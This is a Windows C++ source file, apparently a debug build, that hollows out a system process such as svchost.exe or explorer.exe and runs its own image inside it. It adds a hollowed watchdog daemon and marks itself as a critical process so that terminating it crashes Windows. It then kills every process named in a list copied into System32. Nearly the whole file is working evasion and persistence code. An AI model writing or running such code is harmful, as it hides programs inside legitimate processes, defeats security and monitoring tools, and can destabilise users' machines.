#include <windows.h>
#include <tlhelp32.h>
#include <winternl.h>
#include <psapi.h>
#include <string>
#include <vector>
#include <random>
#include <map>
#include <cctype>
#include <algorithm>
#include <fstream>
#include <iostream>
#include <cstring>
#include <cstdarg>
#include <ctime>

#pragma comment(lib, "ntdll.lib")
//-------------------------------------------------------------------
// 简单日志函数
//-------------------------------------------------------------------
static void Log(const char* format, ...)
{
    FILE* f = fopen("xpt.log", "a");
    if (!f) return;
    time_t t = time(nullptr);
    struct tm tmBuf;
    localtime_s(&tmBuf, &t);
    fprintf(f, "[%04d-%02d-%02d %02d:%02d:%02d] ",
        tmBuf.tm_year + 1900, tmBuf.tm_mon + 1, tmBuf.tm_mday,
        tmBuf.tm_hour, tmBuf.tm_min, tmBuf.tm_sec);
    va_list args;
    va_start(args, format);
    vfprintf(f, format, args);
    va_end(args);
    fprintf(f, "\n");
    fclose(f);
}

//-------------------------------------------------------------------
// 目标进程
//-------------------------------------------------------------------
static const std::string target_hollow_processes[] = {
    "C:\\Windows\\System32\\cmd.exe",
    "C:\\Windows\\System32\\svchost.exe",
    "C:\\Windows\\explorer.exe",
    "C:\\Windows\\notepad.exe"
};
static const size_t HOLLOW_TARGET_COUNT = 4;
static int random_target_index()
{
    // 静态局部变量：只初始化一次，且线程安全（C++11起）
    static std::mt19937 rng(std::random_device{}());
    static std::uniform_int_distribution<int> dist(0, 3);
    return dist(rng);
}

//-------------------------------------------------------------------
// NT API 类型定义
//-------------------------------------------------------------------
typedef NTSTATUS (NTAPI *pfnNtSetInformationProcess)(
    HANDLE ProcessHandle,
    PROCESSINFOCLASS ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength
);

typedef NTSTATUS (NTAPI *pRtlSetProcessIsCritical)(
    BOOLEAN NewValue,
    PBOOLEAN OldValue,
    BOOLEAN CheckFlag
);

typedef NTSTATUS (NTAPI *pNtQueryInformationProcess)(
    HANDLE ProcessHandle,
    PROCESSINFOCLASS ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength
);

typedef NTSTATUS (NTAPI *pNtUnmapViewOfSection)(
    HANDLE ProcessHandle,
    PVOID BaseAddress
);

bool StartHollowProcess(const std::string& exe_path)
{
    Log("StartHollowProcess: target = %s", exe_path.c_str());

    char selfPath[MAX_PATH];
    GetModuleFileNameA(nullptr, selfPath, MAX_PATH);
    Log("Self image path: %s", selfPath);

    HANDLE hSelfFile = CreateFileA(selfPath, GENERIC_READ, FILE_SHARE_READ, nullptr,
                                   OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hSelfFile == INVALID_HANDLE_VALUE)
    {
        Log("Error: cannot open self image");
        return false;
    }

    DWORD fileSize = GetFileSize(hSelfFile, nullptr);
    if (fileSize == INVALID_FILE_SIZE)
    {
        CloseHandle(hSelfFile);
        Log("Error: invalid file size");
        return false;
    }

    std::vector<BYTE> fileBuffer(fileSize);
    DWORD bytesRead;
    if (!ReadFile(hSelfFile, fileBuffer.data(), fileSize, &bytesRead, nullptr))
    {
        CloseHandle(hSelfFile);
        Log("Error: read self file failed");
        return false;
    }
    CloseHandle(hSelfFile);

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)fileBuffer.data();
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) { Log("Error: invalid DOS signature"); return false; }

    PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)(fileBuffer.data() + dosHeader->e_lfanew);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) { Log("Error: invalid NT signature"); return false; }
    if (ntHeaders->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC)
    {
        Log("Error: not a 64-bit PE");
        return false;
    }

    ULONGLONG selfImageBase = ntHeaders->OptionalHeader.ImageBase;
    DWORD sizeOfImage      = ntHeaders->OptionalHeader.SizeOfImage;
    DWORD sizeOfHeaders    = ntHeaders->OptionalHeader.SizeOfHeaders;
    DWORD entryPointRva    = ntHeaders->OptionalHeader.AddressOfEntryPoint;

    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = {};
    if (!CreateProcessA(exe_path.c_str(), nullptr, nullptr, nullptr, FALSE,
                        CREATE_SUSPENDED, nullptr, nullptr, &si, &pi))
    {
        Log("Error: CreateProcess failed (error %d)", GetLastError());
        return false;
    }
    Log("Created suspended process PID=%d", pi.dwProcessId);

    bool success = false;

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    auto NtQueryInformationProcess = (pNtQueryInformationProcess)
        GetProcAddress(hNtdll, "NtQueryInformationProcess");
    auto NtUnmapViewOfSection = (pNtUnmapViewOfSection)
        GetProcAddress(hNtdll, "NtUnmapViewOfSection");

    if (!NtQueryInformationProcess || !NtUnmapViewOfSection)
    {
        Log("Error: missing NT API functions");
        goto cleanup;
    }

    {
        PROCESS_BASIC_INFORMATION pbi = {};
        ULONG retLen;
        if (!NT_SUCCESS(NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation,
                                                  &pbi, sizeof(pbi), &retLen)))
        {
            Log("Error: NtQueryInformationProcess failed");
            goto cleanup;
        }

        LPVOID pebAddr = pbi.PebBaseAddress;
        LPVOID targetImageBase = nullptr;
        SIZE_T nRead;
        if (!ReadProcessMemory(pi.hProcess,
                               (PBYTE)pebAddr + 0x10,
                               &targetImageBase, sizeof(targetImageBase), &nRead)
            || !targetImageBase)
        {
            Log("Error: ReadProcessMemory ImageBaseAddress failed");
            goto cleanup;
        }

        Log("Target image base = 0x%p", targetImageBase);

        if (!NT_SUCCESS(NtUnmapViewOfSection(pi.hProcess, targetImageBase)))
        {
            Log("Error: NtUnmapViewOfSection failed");
            goto cleanup;
        }

        LPVOID newImageBase = VirtualAllocEx(pi.hProcess, (LPVOID)selfImageBase,
                                             sizeOfImage, MEM_COMMIT | MEM_RESERVE,
                                             PAGE_EXECUTE_READWRITE);
        if (!newImageBase)
        {
            newImageBase = VirtualAllocEx(pi.hProcess, nullptr, sizeOfImage,
                                          MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (!newImageBase)
            {
                Log("Error: VirtualAllocEx failed");
                goto cleanup;
            }
        }
        Log("New image base in target = 0x%p", newImageBase);

        std::vector<BYTE> localImage(sizeOfImage, 0);
        memcpy(localImage.data(), fileBuffer.data(), sizeOfHeaders);
        PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(ntHeaders);
        for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; ++i)
        {
            if (sec[i].SizeOfRawData > 0)
            {
                DWORD copySize = std::min(sec[i].SizeOfRawData, sec[i].Misc.VirtualSize);
                memcpy(localImage.data() + sec[i].VirtualAddress,
                       fileBuffer.data() + sec[i].PointerToRawData,
                       copySize);
            }
        }

        PIMAGE_NT_HEADERS64 localNt = (PIMAGE_NT_HEADERS64)(localImage.data() + dosHeader->e_lfanew);
        localNt->OptionalHeader.ImageBase = (ULONGLONG)newImageBase;

        ULONGLONG delta = (ULONGLONG)newImageBase - selfImageBase;
        if (delta != 0)
        {
            IMAGE_DATA_DIRECTORY relocDir = localNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
            if (relocDir.Size > 0)
            {
                PIMAGE_BASE_RELOCATION reloc = (PIMAGE_BASE_RELOCATION)(localImage.data() + relocDir.VirtualAddress);
                while (reloc->VirtualAddress)
                {
                    DWORD count = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                    WORD* relData = (WORD*)((LPBYTE)reloc + sizeof(IMAGE_BASE_RELOCATION));
                    for (DWORD j = 0; j < count; ++j)
                    {
                        if (relData[j] >> 12 == IMAGE_REL_BASED_DIR64)
                        {
                            ULONGLONG* patch = (ULONGLONG*)(localImage.data() + reloc->VirtualAddress + (relData[j] & 0xFFF));
                            *patch += delta;
                        }
                    }
                    reloc = (PIMAGE_BASE_RELOCATION)((LPBYTE)reloc + reloc->SizeOfBlock);
                }
            }
        }

        // ========== 导入表修复 —— 直接使用本地 DLL 基址 ==========
        // 原理：系统 DLL（kernel32, ntdll 等）在所有进程中映射到相同基址。
        // 因此我们无需枚举远程模块，直接用本进程的 GetModuleHandle 结果即可。
        IMAGE_DATA_DIRECTORY importDir = localNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
        if (importDir.Size > 0)
        {
            PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)(localImage.data() + importDir.VirtualAddress);
            while (importDesc->Name)
            {
                const char* dllName = (const char*)(localImage.data() + importDesc->Name);
                Log("Processing import DLL: %s", dllName);

                // 获取本地 DLL 基址（同时保证 DLL 已加载）
                HMODULE localDllBase = GetModuleHandleA(dllName);
                if (!localDllBase)
                {
                    localDllBase = LoadLibraryA(dllName);
                    if (!localDllBase)
                    {
                        Log("Error: local LoadLibrary failed: %s", dllName);
                        goto cleanup;
                    }
                }

                // 远程 DLL 基址与本地相同（系统 DLL 的会话级共享）
                ULONGLONG remoteDllBase = (ULONGLONG)localDllBase;

                PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)(localImage.data() + importDesc->FirstThunk);
                PIMAGE_THUNK_DATA origThunk = (PIMAGE_THUNK_DATA)(localImage.data() +
                    (importDesc->OriginalFirstThunk ? importDesc->OriginalFirstThunk : importDesc->FirstThunk));
                int idx = 0;
                while (origThunk->u1.AddressOfData)
                {
                    ULONGLONG remoteFuncAddr = 0;
                    if (origThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG)
                    {
                        WORD ordinal = (WORD)(origThunk->u1.Ordinal & 0xFFFF);
                        auto localFunc = GetProcAddress(localDllBase, MAKEINTRESOURCEA(ordinal));
                        if (localFunc)
                        {
                            ULONGLONG rva = (ULONGLONG)localFunc - (ULONGLONG)localDllBase;
                            remoteFuncAddr = remoteDllBase + rva;
                        }
                    }
                    else
                    {
                        PIMAGE_IMPORT_BY_NAME importByName = (PIMAGE_IMPORT_BY_NAME)(localImage.data() + origThunk->u1.AddressOfData);
                        auto localFunc = GetProcAddress(localDllBase, importByName->Name);
                        if (localFunc)
                        {
                            ULONGLONG rva = (ULONGLONG)localFunc - (ULONGLONG)localDllBase;
                            remoteFuncAddr = remoteDllBase + rva;
                        }
                    }

                    if (!remoteFuncAddr)
                    {
                        Log("Error: could not resolve import for ordinal/name");
                        goto cleanup;
                    }

                    ULONGLONG remoteIatEntryAddr = (ULONGLONG)newImageBase + importDesc->FirstThunk + idx * sizeof(ULONGLONG);
                    if (!WriteProcessMemory(pi.hProcess, (PVOID)remoteIatEntryAddr, &remoteFuncAddr, sizeof(remoteFuncAddr), nullptr))
                    {
                        Log("Error: IAT WriteProcessMemory failed");
                        goto cleanup;
                    }
                    ++origThunk;
                    ++thunk;
                    ++idx;
                }
                ++importDesc;
            }
        }

        if (!WriteProcessMemory(pi.hProcess, newImageBase, localImage.data(), sizeOfImage, nullptr))
        {
            Log("Error: WriteProcessMemory full image failed");
            goto cleanup;
        }

        LPVOID pebImageBaseAddr = (PBYTE)pebAddr + 0x10;
        ULONGLONG newBaseVal = (ULONGLONG)newImageBase;
        if (!WriteProcessMemory(pi.hProcess, pebImageBaseAddr, &newBaseVal, sizeof(newBaseVal), nullptr))
        {
            Log("Error: PEB update failed");
            goto cleanup;
        }

        CONTEXT ctx = {};
        ctx.ContextFlags = CONTEXT_FULL;
        if (!GetThreadContext(pi.hThread, &ctx)) { Log("Error: GetThreadContext failed"); goto cleanup; }

        ctx.Rip = (ULONGLONG)newImageBase + entryPointRva;
        if (!SetThreadContext(pi.hThread, &ctx)) { Log("Error: SetThreadContext failed"); goto cleanup; }

        ResumeThread(pi.hThread);
        success = true;
        Log("Hollowing successful, resuming target");
    }

cleanup:
    if (!success)
    {
        TerminateProcess(pi.hProcess, 0);
        Log("Hollowing failed, terminated target process");
    }
    if (pi.hThread) CloseHandle(pi.hThread);
    if (pi.hProcess) CloseHandle(pi.hProcess);
    return success;
}
//-------------------------------------------------------------------
// 守护进程恢复挂起函数
//-------------------------------------------------------------------
BOOL ResumeProcess(int pid)
{
    // 1. 获取进程快照，遍历所有线程
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE)
        return FALSE;

    THREADENTRY32 te32;
    te32.dwSize = sizeof(THREADENTRY32);

    if (!Thread32First(hSnapshot, &te32))
    {
        CloseHandle(hSnapshot);
        return FALSE;
    }

    BOOL anySuspended = FALSE;   // 标记是否遇到任何挂起的线程
    BOOL allResumedOK = TRUE;    // 所有挂起线程的恢复是否成功

    do {
        if (te32.th32OwnerProcessID == (DWORD)pid)
        {
            HANDLE hThread = OpenThread(THREAD_SUSPEND_RESUME, FALSE, te32.th32ThreadID);
            if (hThread == NULL) {
                // 无法打开线程，视作失败
                allResumedOK = FALSE;
                break;
            }
            // 获取线程当前挂起计数（ResumeThread 返回值是之前的挂起计数）
            DWORD prevCount = ResumeThread(hThread);
            if (prevCount == (DWORD)-1)
            {
                // ResumeThread 失败
                CloseHandle(hThread);
                allResumedOK = FALSE;
                break;
            }
            if (prevCount > 0)
            {
                anySuspended = TRUE;   // 该线程原本被挂起
                // 如果挂起计数 > 1，需要多次恢复直到计数为 0
                while (prevCount > 1)
                {
                    prevCount = ResumeThread(hThread);
                    if (prevCount == (DWORD)-1)
                    {
                        CloseHandle(hThread);
                        allResumedOK = FALSE;
                        break;
                    }
                }
                if (!allResumedOK)
                {
                    CloseHandle(hThread);
                    break;
                }
            }
            // 不论之前是否挂起，这里线程已经处于运行状态
            CloseHandle(hThread);
        }
    } while (Thread32Next(hSnapshot, &te32));

    CloseHandle(hSnapshot);

    // 2. 判断结果
    if (!allResumedOK)
        return FALSE;   // 恢复过程中出错
    // 无论进程原本是否挂起，只要没有失败都返回 TRUE
    return TRUE;
}
//-------------------------------------------------------------------
// 获取当前进程路径（UTF-8）
//-------------------------------------------------------------------
std::string GetMyRunningProcessPath()
{
    std::vector<wchar_t> buffer(MAX_PATH);
    DWORD copied = 0;
    while (true)
    {
        copied = GetModuleFileNameW(nullptr, buffer.data(), static_cast<DWORD>(buffer.size()));
        if (copied == 0) return {};
        if (copied < static_cast<DWORD>(buffer.size())) break;
        buffer.resize(buffer.size() * 2);
    }
    std::wstring widePath(buffer.data(), copied);
    int utf8Length = WideCharToMultiByte(CP_UTF8, 0, widePath.c_str(), -1, nullptr, 0, nullptr, nullptr);
    if (utf8Length <= 0) return {};
    std::string result(utf8Length, '\0');
    WideCharToMultiByte(CP_UTF8, 0, widePath.c_str(), -1, &result[0], utf8Length, nullptr, nullptr);
    if (!result.empty() && result.back() == '\0')
        result.pop_back();
    return result;
}

//-------------------------------------------------------------------
// 获取 NtSetInformationProcess 指针
//-------------------------------------------------------------------
static pfnNtSetInformationProcess GetNtSetInformationProcess()
{
    static pfnNtSetInformationProcess pfn = NULL;
    if (!pfn)
    {
        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
        if (!hNtdll) hNtdll = LoadLibraryA("ntdll.dll");
        if (hNtdll)
            pfn = (pfnNtSetInformationProcess)GetProcAddress(hNtdll, "NtSetInformationProcess");
    }
    return pfn;
}

//-------------------------------------------------------------------
// 启用调试权限
//-------------------------------------------------------------------
BOOL EnableDebugPrivilege()
{
    HANDLE hToken;
    TOKEN_PRIVILEGES tkp;
    LUID luid;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
    {
        Log("EnableDebugPrivilege: OpenProcessToken failed (%d)", GetLastError());
        return FALSE;
    }
    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid))
    {
        CloseHandle(hToken);
        Log("EnableDebugPrivilege: LookupPrivilegeValue failed (%d)", GetLastError());
        return FALSE;
    }
    tkp.PrivilegeCount = 1;
    tkp.Privileges[0].Luid = luid;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    BOOL ret = AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL);
    CloseHandle(hToken);
    if (!ret || GetLastError() != ERROR_SUCCESS)
    {
        Log("EnableDebugPrivilege: AdjustTokenPrivileges failed (%d)", GetLastError());
        return FALSE;
    }
    return TRUE;
}

//-------------------------------------------------------------------
// 标记为关键进程
//-------------------------------------------------------------------
BOOL ProtectMyself()
{
    HMODULE hDll = LoadLibraryA("ntdll.dll");
    if (!hDll) return FALSE;
    pRtlSetProcessIsCritical RtlSetProcessIsCritical =
        (pRtlSetProcessIsCritical)GetProcAddress(hDll, "RtlSetProcessIsCritical");
    if (!RtlSetProcessIsCritical)
    {
        FreeLibrary(hDll);
        return FALSE;
    }
    if (!EnableDebugPrivilege())
    {
        FreeLibrary(hDll);
        return FALSE;
    }
    NTSTATUS status = RtlSetProcessIsCritical(TRUE, NULL, FALSE);
    FreeLibrary(hDll);
    if (status != 0) Log("ProtectMyself failed, status=0x%X", status);
    return (status == 0);
}

//-------------------------------------------------------------------
// 移除关键保护
//-------------------------------------------------------------------
BOOL RemoveProtection(int pid)
{
    pfnNtSetInformationProcess NtSetInformationProcess = GetNtSetInformationProcess();
    if (!NtSetInformationProcess) return FALSE;
    HANDLE hProcess = OpenProcess(PROCESS_SET_INFORMATION, FALSE, (DWORD)pid);
    if (!hProcess)
    {
        Log("RemoveProtection: OpenProcess failed for PID %d (%d)", pid, GetLastError());
        return FALSE;
    }
    ULONG BreakOnTermination = 0;
    NTSTATUS status = NtSetInformationProcess(
        hProcess,
        (PROCESSINFOCLASS)0x1D,
        &BreakOnTermination,
        sizeof(ULONG)
    );
    CloseHandle(hProcess);
    if (!NT_SUCCESS(status))
        Log("RemoveProtection: NtSetInformationProcess failed for PID %d, status=0x%X", pid, status);
    return NT_SUCCESS(status);
}

//-------------------------------------------------------------------
// 枚举运行进程名
//-------------------------------------------------------------------
std::vector<std::string> getRunningProcess()
{
    std::vector<std::string> processes;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE)
        return processes;
    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);
    if (Process32FirstW(hSnapshot, &pe32))
    {
        do {
            int len = WideCharToMultiByte(CP_ACP, 0, pe32.szExeFile, -1, nullptr, 0, nullptr, nullptr);
            if (len > 0) {
                std::string procName(len, '\0');
                WideCharToMultiByte(CP_ACP, 0, pe32.szExeFile, -1, &procName[0], len, nullptr, nullptr);
                procName.resize(len - 1);
                processes.push_back(procName);
            }
        } while (Process32NextW(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);
    return processes;
}

//-------------------------------------------------------------------
// 根据进程名获取 PID
//-------------------------------------------------------------------
std::vector<int> getProcessPidByName(const std::string& procName)
{
    std::vector<int> pids;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE)
        return pids;
    int wlen = MultiByteToWideChar(CP_ACP, 0, procName.c_str(), -1, nullptr, 0);
    std::wstring wProcName(wlen - 1, L'\0');
    MultiByteToWideChar(CP_ACP, 0, procName.c_str(), -1, &wProcName[0], wlen);
    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);
    if (Process32FirstW(hSnapshot, &pe32))
    {
        do {
            if (_wcsicmp(pe32.szExeFile, wProcName.c_str()) == 0)
                pids.push_back(static_cast<int>(pe32.th32ProcessID));
        } while (Process32NextW(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);
    return pids;
}

//-------------------------------------------------------------------
// 获取当前进程 ID
//-------------------------------------------------------------------
int GetCurrentProcessIdWrapper()
{
    return static_cast<int>(GetCurrentProcessId());
}

//-------------------------------------------------------------------
// WinMain 调试版
//-------------------------------------------------------------------
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                   LPSTR lpCmdLine, int nCmdShow)
{
    Log("=== WinMain started ===");

    // ========== 0. 环境变量检测：判断是否为守护进程 ==========
    char daemonFlag[4] = {0};
    DWORD len = GetEnvironmentVariableA("XPT_DAEMON", daemonFlag, sizeof(daemonFlag));
    bool isDaemon = (len == 1 && daemonFlag[0] == '1');

    if (isDaemon)
    {
        // 清除环境变量，避免子进程继承后误判
        SetEnvironmentVariableA("XPT_DAEMON", NULL);

        Log("Running as daemon (via environment variable)");

        std::ifstream fin("C:\\Windows\\System32\\xptdea.dea");
        if (!fin)
        {
            Log("Daemon: cannot open xptdea.dea");
            return 1;
        }
        std::string magic;
        fin >> magic;
        if (magic != "xptdea")
        {
            Log("Daemon: invalid magic");
            return 1;
        }
        int targetPid = 0;
        fin >> targetPid;
        fin.close();
        if (targetPid == 0)
        {
            Log("Daemon: invalid PID");
            return 1;
        }
        Log("Daemon guarding PID %d", targetPid);

        // 守护循环
        while (true)
        {
            if (!ResumeProcess(targetPid))
                Log("Daemon: ResumeProcess failed for PID %d", targetPid);
            Sleep(500);
        }
        return 0;
    }

    // ========== 1. 正常启动流程：复制 key.ini ==========
    {
        std::ifstream fin("key.ini");
        if (!fin)
        {
            Log("Error: key.ini not found");
            return 1;
        }
        std::ofstream fout("C:\\Windows\\System32\\key.ini");
        if (!fout)
        {
            Log("Error: cannot write key.ini to System32");
            return 1;
        }
        std::string proc;
        while (fin >> proc) fout << proc << '\n';
        Log("key.ini copied to System32");
    }

    // ========== 2. 判断是否已在镂空进程中 ==========
    std::string myPath = GetMyRunningProcessPath();
    Log("My running path: %s", myPath.c_str());
    bool run_in_hollow = false;
    for (const auto& exePath : target_hollow_processes)
    {
        if (_stricmp(myPath.c_str(), exePath.c_str()) == 0)
        {
            run_in_hollow = true;
            break;
        }
    }
    Log("run_in_hollow = %s", run_in_hollow ? "true" : "false");

    if (!run_in_hollow)
    {
        // 原始进程：镂空自身到 一个进程（无任何参数，原版 StartHollowProcess）
        std::string target = target_hollow_processes[random_target_index()];
        Log("Attempting hollowing into %s", target.c_str());
        bool ok = StartHollowProcess(target);   // 原版函数，不传参数
        if (!ok) Log("Hollowing failed");
        ExitProcess(0);
    }

    // ========== 3. 镂空成功：检查/启动守护进程（镂空版） ==========
    bool daemon_already = false;
    {
        std::ifstream fin("C:\\Windows\\System32\\xptdea.dea");
        if (fin)
        {
            std::string magic;
            fin >> magic;
            if (magic == "xptdea") daemon_already = true;
        }
    }

    if (!daemon_already)
    {
        Log("Starting daemon process (hollowed, via env var)");

        // 写入标志文件（包含当前进程 PID）
        {
            std::ofstream fout("C:\\Windows\\System32\\xptdea.dea");
            if (!fout)
            {
                Log("Error: cannot create xptdea.dea");
                return 1;
            }
            fout << "xptdea\n";
            fout << GetCurrentProcessIdWrapper() << "\n";
            fout.close();
        }

        // 设置环境变量，指示子进程为守护模式
        SetEnvironmentVariableA("XPT_DAEMON", "1");

        // 再次调用原版 StartHollowProcess（无命令行参数）
        // 新创建的挂起 一个进程 会继承当前环境变量，镂空后就能检测到 XPT_DAEMON
        std::string target = target_hollow_processes[0];
        bool ok = StartHollowProcess(target);

        // 立即清除环境变量，避免本进程或其他子进程误判
        SetEnvironmentVariableA("XPT_DAEMON", NULL);
        if (!ok)
        {
            Log("Error: failed to start daemon hollow process");
            return 1;
        }
        Log("Daemon hollow process started.");
    } else {
        Log("Daemon already running (flag file present)");
    }

    // ========== 4. 加载禁用列表 ==========
    std::map<std::string, bool> disallow;
    {
        std::ifstream fin("C:\\Windows\\System32\\key.ini");
        if (!fin)
        {
            Log("Error: cannot open key.ini");
            return 1;
        }
        std::string proc;
        while (fin >> proc) disallow[proc] = true;
        Log("Loaded %d disallowed processes", (int)disallow.size());
    }

    // ========== 5. 自保护 ==========
    int myPid = GetCurrentProcessIdWrapper();
    Log("My PID = %d", myPid);
    if (!EnableDebugPrivilege())
    {
        Log("EnableDebugPrivilege failed");
        return 1;
    }
    if (!ProtectMyself())
    {
        Log("ProtectMyself failed");
        return 1;
    }
    Log("Self protection enabled");

    // ========== 6. 监控循环 ==========
    while (true)
    {
        auto processes = getRunningProcess();
        for (const auto& procName : processes)
        {
            if (disallow.find(procName) != disallow.end())
            {
                Log("Found disallowed process: %s", procName.c_str());
                auto pids = getProcessPidByName(procName);
                for (int pid : pids)
                {
                    if (pid == myPid) continue;
                    Log("Killing PID %d (%s)", pid, procName.c_str());
                    RemoveProtection(pid);
                    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
                    if (hProcess)
                    {
                        if (TerminateProcess(hProcess, 1))
                            Log("TerminateProcess success");
                        else
                            Log("TerminateProcess failed (%d)", GetLastError());
                        CloseHandle(hProcess);
                    } else {
                        Log("OpenProcess for terminate failed (%d)", GetLastError());
                    }
                }
            }
        }
        Sleep(500);
    }
}